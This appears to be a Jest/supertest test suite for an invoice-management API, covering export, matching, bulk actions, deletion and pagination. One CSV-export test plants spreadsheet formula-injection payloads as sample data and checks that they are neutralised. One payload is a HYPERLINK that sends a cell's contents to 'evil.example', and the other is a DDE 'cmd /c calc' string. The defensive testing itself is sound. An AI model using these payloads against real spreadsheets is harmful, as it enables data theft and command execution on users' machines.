import request from "supertest";
import { app } from "../src/app.js";
import { Invoice } from "../src/models/index.js";
import { authHeader, resetDb, signup } from "./testUtils.js";

beforeEach(resetDb);

async function makeInvoice(orgId, overrides = {}) {
  return Invoice.create({
    orgId,
    originalFilename: "test.pdf",
    storagePath: "/tmp/does-not-matter.pdf",
    contentType: "application/pdf",
    status: "extracted",
    vendorName: "Acme Supplies Inc",
    invoiceNumber: "INV-1",
    total: 1000.0,
    overallConfidence: 0.95,
    ...overrides,
  });
}

async function orgId(token) {
  const res = await request(app).get("/api/auth/me").set(authHeader(token));
  return res.body.org_id;
}

test("health", async () => {
  const res = await request(app).get("/api/health");
  expect(res.status).toBe(200);
  expect(res.body).toEqual({ status: "ok" });
});

test("upload rejects unsupported file type", async () => {
  const token = await signup(app, request);
  const res = await request(app)
    .post("/api/invoices/upload")
    .set(authHeader(token))
    .attach("file", Buffer.from("hello"), { filename: "notes.txt", contentType: "text/plain" });
  expect(res.status).toBe(422);
});

test("matching upload and run", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  const invoice = await makeInvoice(org);

  const csv = "vendor,amount,date,reference\nAcme Supplies Inc,1000.00,2026-01-05,PO-1\n";
  let res = await request(app)
    .post("/api/matching/sources?source_type=po")
    .set(authHeader(token))
    .attach("file", Buffer.from(csv), { filename: "po.csv", contentType: "text/csv" });
  expect(res.status).toBe(201);
  expect(res.body.entry_count).toBe(1);

  res = await request(app).post("/api/matching/run").set(authHeader(token));
  expect(res.status).toBe(200);
  expect(res.body.invoices_evaluated).toBe(1);
  expect(res.body.matched).toBe(1);

  res = await request(app).get("/api/matching/results").set(authHeader(token));
  expect(res.status).toBe(200);
  expect(res.body[0].invoice_id).toBe(invoice.id);
  expect(res.body[0].status).toBe("matched");
});

test("matching source requires vendor and amount columns", async () => {
  const token = await signup(app, request);
  const csv = "foo,bar\n1,2\n";
  const res = await request(app)
    .post("/api/matching/sources?source_type=bank")
    .set(authHeader(token))
    .attach("file", Buffer.from(csv), { filename: "bad.csv", contentType: "text/csv" });
  expect(res.status).toBe(422);
});

test("export csv", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  await makeInvoice(org);

  const res = await request(app).get("/api/export/csv").set(authHeader(token));
  expect(res.status).toBe(200);
  expect(res.text).toContain("Acme Supplies Inc");
});

test("export csv neutralizes formula-injection payloads instead of exporting live formulas", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  await makeInvoice(org, {
    vendorName: '=HYPERLINK("http://evil.example/steal?x="&A1,"Click")',
    originalFilename: "@SUM(1+1)*cmd|'/c calc'!A1",
  });

  const res = await request(app).get("/api/export/csv").set(authHeader(token));
  expect(res.status).toBe(200);
  // vendor_name contains a comma/quote, so csv-quoting wraps the field in
  // "..." -- the sanitizer's apostrophe must appear right after that
  // opening quote, not just anywhere before "HYPERLINK" (a naive regex
  // checking "no quote/apostrophe immediately before" would pass even
  // unsanitized here, since CSV's own quoting also inserts a `"` there).
  expect(res.text).toContain('"\'=HYPERLINK(');
  expect(res.text).not.toContain('"=HYPERLINK(');
  // original_filename has no special CSV characters, so it's written
  // unquoted -- the apostrophe must sit directly after the preceding comma.
  expect(res.text).toContain(",'@SUM(1+1)");
  expect(res.text).not.toContain(",@SUM(1+1)");
});

test("invoice correction writes audit log", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  const invoice = await makeInvoice(org);

  let res = await request(app)
    .patch(`/api/invoices/${invoice.id}`)
    .set(authHeader(token))
    .send({ vendor_name: "Acme Corrected" });
  expect(res.status).toBe(200);
  expect(res.body.vendor_name).toBe("Acme Corrected");

  res = await request(app).get(`/api/invoices/${invoice.id}/audit-log`).set(authHeader(token));
  const actions = res.body.map((e) => e.action);
  expect(actions).toContain("human_correction");
});

test("correcting a vendor name teaches it as an alias for next time", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  const invoice = await makeInvoice(org); // default vendorName: "Acme Supplies Inc"

  const res = await request(app)
    .patch(`/api/invoices/${invoice.id}`)
    .set(authHeader(token))
    .send({ vendor_name: "Acme Corrected" });
  expect(res.status).toBe(200);

  const { lookupVendorAlias } = await import("../src/vendorAlias.js");
  const alias = await lookupVendorAlias(org, "Acme Supplies Inc");
  expect(alias.canonicalVendorName).toBe("Acme Corrected");
});

test("approve invoice", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  const invoice = await makeInvoice(org);

  const res = await request(app).post(`/api/invoices/${invoice.id}/approve`).set(authHeader(token));
  expect(res.status).toBe(200);
  expect(res.body.status).toBe("approved");
});

test("retrying a failed invoice re-queues it and clears the error message", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  const invoice = await makeInvoice(org, { status: "failed", errorMessage: "OCR failed: boom" });

  const res = await request(app).post(`/api/invoices/${invoice.id}/retry`).set(authHeader(token));
  expect(res.status).toBe(200);
  expect(res.body.status).toBe("queued");
  expect(res.body.error_message).toBe("");

  const auditRes = await request(app).get(`/api/invoices/${invoice.id}/audit-log`).set(authHeader(token));
  expect(auditRes.body.map((e) => e.action)).toContain("retry_requested");
});

test("cannot retry an already-approved invoice", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  const invoice = await makeInvoice(org, { status: "approved" });

  const res = await request(app).post(`/api/invoices/${invoice.id}/retry`).set(authHeader(token));
  expect(res.status).toBe(409);

  await invoice.reload();
  expect(invoice.status).toBe("approved"); // untouched
});

test("retrying a nonexistent or another org's invoice 404s", async () => {
  const tokenA = await signup(app, request, { email: "retry-a@example.co", orgName: "Org A" });
  const tokenB = await signup(app, request, { email: "retry-b@example.co", orgName: "Org B" });
  const orgB = await orgId(tokenB);
  const theirs = await makeInvoice(orgB, { status: "failed" });

  const bogus = await request(app).post("/api/invoices/not-a-real-id/retry").set(authHeader(tokenA));
  expect(bogus.status).toBe(404);

  const wrongOrg = await request(app).post(`/api/invoices/${theirs.id}/retry`).set(authHeader(tokenA));
  expect(wrongOrg.status).toBe(404);
});

test("bulk-approve applies to every eligible invoice in one call", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  const a = await makeInvoice(org, { status: "extracted" });
  const b = await makeInvoice(org, { status: "needs_review" });

  const res = await request(app)
    .post("/api/invoices/bulk-action")
    .set(authHeader(token))
    .send({ ids: [a.id, b.id], action: "approve" });
  expect(res.status).toBe(200);
  expect(res.body.succeeded.sort()).toEqual([a.id, b.id].sort());
  expect(res.body.skipped).toEqual([]);

  await a.reload();
  await b.reload();
  expect(a.status).toBe("approved");
  expect(b.status).toBe("approved");

  const auditRes = await request(app).get(`/api/invoices/${a.id}/audit-log`).set(authHeader(token));
  expect(auditRes.body.map((e) => e.action)).toContain("approved");
});

test("bulk-approve skips an invoice whose status can't be approved, without failing the rest", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  const approvable = await makeInvoice(org, { status: "extracted" });
  const alreadyApproved = await makeInvoice(org, { status: "approved" });

  const res = await request(app)
    .post("/api/invoices/bulk-action")
    .set(authHeader(token))
    .send({ ids: [approvable.id, alreadyApproved.id], action: "approve" });
  expect(res.status).toBe(200);
  expect(res.body.succeeded).toEqual([approvable.id]);
  expect(res.body.skipped).toEqual([{ id: alreadyApproved.id, reason: expect.stringContaining("approved") }]);
});

test("bulk-reject has no status restriction, unlike bulk-approve", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  const invoice = await makeInvoice(org, { status: "approved" });

  const res = await request(app)
    .post("/api/invoices/bulk-action")
    .set(authHeader(token))
    .send({ ids: [invoice.id], action: "reject" });
  expect(res.status).toBe(200);
  expect(res.body.succeeded).toEqual([invoice.id]);

  await invoice.reload();
  expect(invoice.status).toBe("rejected");
});

test("bulk-action cannot reach another org's invoice, and doesn't fail the whole batch trying", async () => {
  const ownerA = await signup(app, request, { email: "bulk-a@example.co", orgName: "Org A" });
  const ownerB = await signup(app, request, { email: "bulk-b@example.co", orgName: "Org B" });
  const orgA = await orgId(ownerA);
  const orgB = await orgId(ownerB);
  const mine = await makeInvoice(orgA, { status: "extracted" });
  const theirs = await makeInvoice(orgB, { status: "extracted" });

  const res = await request(app)
    .post("/api/invoices/bulk-action")
    .set(authHeader(ownerA))
    .send({ ids: [mine.id, theirs.id], action: "approve" });
  expect(res.status).toBe(200);
  expect(res.body.succeeded).toEqual([mine.id]);
  expect(res.body.skipped).toEqual([{ id: theirs.id, reason: "Invoice not found" }]);

  await theirs.reload();
  expect(theirs.status).toBe("extracted"); // untouched
});

test("bulk-action rejects an empty id list or an unrecognized action", async () => {
  const token = await signup(app, request);

  const emptyIds = await request(app).post("/api/invoices/bulk-action").set(authHeader(token)).send({ ids: [], action: "approve" });
  expect(emptyIds.status).toBe(422);

  const badAction = await request(app)
    .post("/api/invoices/bulk-action")
    .set(authHeader(token))
    .send({ ids: ["whatever"], action: "delete" });
  expect(badAction.status).toBe(422);
});

test("deleting an invoice removes it from the list and detail views", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  const invoice = await makeInvoice(org);

  const res = await request(app).delete(`/api/invoices/${invoice.id}`).set(authHeader(token));
  expect(res.status).toBe(200);
  expect(res.body.ok).toBe(true);

  const listRes = await request(app).get("/api/invoices").set(authHeader(token));
  expect(listRes.body.items.map((i) => i.id)).not.toContain(invoice.id);

  const detailRes = await request(app).get(`/api/invoices/${invoice.id}`).set(authHeader(token));
  expect(detailRes.status).toBe(404);
});

test("deleting an invoice is not blocked by its status -- e.g. an already-approved one", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  const invoice = await makeInvoice(org, { status: "approved" });

  const res = await request(app).delete(`/api/invoices/${invoice.id}`).set(authHeader(token));
  expect(res.status).toBe(200);
});

test("deleting the same invoice twice, or one that never existed, 404s", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  const invoice = await makeInvoice(org);

  await request(app).delete(`/api/invoices/${invoice.id}`).set(authHeader(token));
  const secondDelete = await request(app).delete(`/api/invoices/${invoice.id}`).set(authHeader(token));
  expect(secondDelete.status).toBe(404);

  const bogus = await request(app).delete("/api/invoices/not-a-real-id").set(authHeader(token));
  expect(bogus.status).toBe(404);
});

test("cannot delete an invoice belonging to another org", async () => {
  const tokenA = await signup(app, request, { email: "orga-owner@example.co", orgName: "Org A" });
  const tokenB = await signup(app, request, { email: "orgb-owner@example.co", orgName: "Org B" });
  const orgA = await orgId(tokenA);
  const invoice = await makeInvoice(orgA);

  const res = await request(app).delete(`/api/invoices/${invoice.id}`).set(authHeader(tokenB));
  expect(res.status).toBe(404);

  // Still there for its actual owner.
  const detailRes = await request(app).get(`/api/invoices/${invoice.id}`).set(authHeader(tokenA));
  expect(detailRes.status).toBe(200);
});

test("fetching a source file that no longer exists on disk returns a clean 404, not a raw path-leaking 500", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  const invoice = await makeInvoice(org); // storagePath points at a file that was never actually written

  const res = await request(app).get(`/api/invoices/${invoice.id}/file`).set(authHeader(token));
  expect(res.status).toBe(404);
  expect(res.body.detail).not.toMatch(/\/tmp\//); // shouldn't leak the server-side storage path
});

test("GET /api/invoices paginates and reports the true total", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  for (let i = 0; i < 5; i++) await makeInvoice(org, { invoiceNumber: `INV-${i}` });

  let res = await request(app).get("/api/invoices?page_size=2&page=1").set(authHeader(token));
  expect(res.status).toBe(200);
  expect(res.body.items).toHaveLength(2);
  expect(res.body.total).toBe(5);
  expect(res.body.page).toBe(1);
  expect(res.body.page_size).toBe(2);

  res = await request(app).get("/api/invoices?page_size=2&page=3").set(authHeader(token));
  expect(res.body.items).toHaveLength(1); // 5 invoices, page 3 of size 2 has only the remainder
  expect(res.body.total).toBe(5);

  // page_size is bounded, not passed straight through
  res = await request(app).get("/api/invoices?page_size=99999").set(authHeader(token));
  expect(res.body.page_size).toBe(500);
});

test("GET /api/invoices?q searches vendor name and invoice number, case-insensitively", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  await makeInvoice(org, { vendorName: "Acme Supplies Inc", invoiceNumber: "INV-100" });
  await makeInvoice(org, { vendorName: "Best Bolts Co", invoiceNumber: "INV-200" });

  let res = await request(app).get("/api/invoices?q=acme").set(authHeader(token));
  expect(res.body.items).toHaveLength(1);
  expect(res.body.items[0].vendor_name).toBe("Acme Supplies Inc");

  res = await request(app).get("/api/invoices?q=INV-200").set(authHeader(token));
  expect(res.body.items).toHaveLength(1);
  expect(res.body.items[0].vendor_name).toBe("Best Bolts Co");

  res = await request(app).get("/api/invoices?q=nonexistent-vendor").set(authHeader(token));
  expect(res.body.items).toHaveLength(0);
});

test("GET /api/invoices?sort orders by an allowlisted field, ignoring anything else", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  await makeInvoice(org, { vendorName: "Zeta Corp", total: 50, invoiceNumber: "A" });
  await makeInvoice(org, { vendorName: "Alpha Corp", total: 500, invoiceNumber: "B" });

  let res = await request(app).get("/api/invoices?sort=vendor_name&order=asc").set(authHeader(token));
  expect(res.body.items.map((i) => i.vendor_name)).toEqual(["Alpha Corp", "Zeta Corp"]);

  res = await request(app).get("/api/invoices?sort=total&order=desc").set(authHeader(token));
  expect(res.body.items.map((i) => i.total)).toEqual([500, 50]);

  // an unrecognized sort key falls back to the default rather than erroring or sorting arbitrarily
  res = await request(app).get("/api/invoices?sort=storagePath&order=asc").set(authHeader(token));
  expect(res.status).toBe(200);
});
